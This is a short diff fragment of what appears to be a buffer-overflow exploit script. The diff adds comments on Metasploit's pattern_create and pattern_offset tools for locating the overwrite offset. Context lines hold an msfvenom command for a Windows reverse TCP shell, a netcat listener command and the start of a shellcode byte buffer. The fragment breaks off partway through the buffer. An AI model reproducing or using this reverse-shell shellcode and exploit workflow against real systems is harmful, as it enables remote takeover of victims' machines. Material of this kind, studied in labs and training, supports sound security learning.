@@ -10,6 +10,8 @@ data = ""
 
 #msfvenom -p windows/shell_reverse_tcp LHOST=host LPORT=port -f python -b "\x00"
 #nc -nvlp port
+#./pattern_create.rb -l 1024 
+#./pattern_offset.rb -q 35724134 -l 1024
 buf =  b""
 buf += b"\xdb\xcb\xb8\xaa\x18\x1d\x1c\xd9\x74\x24\xf4\x5f\x2b"
 buf += b"\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc\x03\xed\x0b\xff"
